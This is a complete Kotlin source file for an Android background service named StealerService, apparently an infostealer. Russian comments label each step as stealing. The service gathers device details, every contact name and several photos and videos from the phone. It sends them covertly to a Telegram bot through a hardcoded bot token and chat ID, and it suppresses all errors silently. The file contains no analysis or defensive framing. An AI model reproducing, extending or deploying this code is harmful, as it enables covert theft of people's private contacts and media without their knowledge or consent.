package com.stealer

import android.app.Service
import android.content.ContentUris
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class StealerService : Service() {

    private val client = OkHttpClient()
    private val botToken = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ"
    private val chatId = "2020792314"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                // 1. Крадем информацию об устройстве
                val deviceInfo = """
                🕵️‍♂️ ПОЛНЫЙ ОТЧЕТ УСТРОЙСТВА
                ⏰ Время: ${SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
                
                📱 Модель: ${android.os.Build.MODEL}
                🏭 Производитель: ${android.os.Build.MANUFACTURER}
                🤖 Android: ${android.os.Build.VERSION.RELEASE}
                🔧 Продукт: ${android.os.Build.PRODUCT}
                📦 Отпечаток: ${android.os.Build.FINGERPRINT}
                """.trimIndent()
                
                sendToTelegram(deviceInfo)

                // 2. Крадем контакты
                val contacts = StringBuilder()
                val cursor = contentResolver.query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null
                )
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        contacts.append("👤 $name\n")
                    }
                }
                sendToTelegram("📞 КОНТАКТЫ:\n${contacts.toString().take(4000)}")

                // 3. Крадем медиа файлы
                val mediaUris = listOf(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                )
                
                mediaUris.forEach { uri ->
                    val mediaCursor = contentResolver.query(
                        uri,
                        arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
                        null, null, null
                    )
                    
                    mediaCursor?.use {
                        var count = 0
                        while (it.moveToNext() && count < 5) {
                            val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                            val name = it.getString(it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
                            
                            val fileUri = ContentUris.withAppendedId(uri, id)
                            val inputStream = contentResolver.openInputStream(fileUri)
                            
                            inputStream?.use { stream ->
                                val tempFile = File(cacheDir, "stolen_$name")
                                FileOutputStream(tempFile).use { output ->
                                    stream.copyTo(output)
                                }
                                sendFileToTelegram(tempFile, "📁 $name")
                                tempFile.delete()
                            }
                            count++
                        }
                    }
                }

            } catch (e: Exception) {
            }
        }.start()
        
        stopSelf()
        return START_NOT_STICKY
    }

    private fun sendToTelegram(message: String) {
        try {
            val url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${message.take(4000)}"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute()
        } catch (e: Exception) {
        }
    }

    private fun sendFileToTelegram(file: File, caption: String) {
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption.take(200))
                .addFormDataPart("document", file.name, 
                    RequestBody.create(MediaType.parse("application/octet-stream"), file))
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$botToken/sendDocument")
                .post(requestBody)
                .build()

            client.newCall(request).execute()
        } catch (e: Exception) {
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
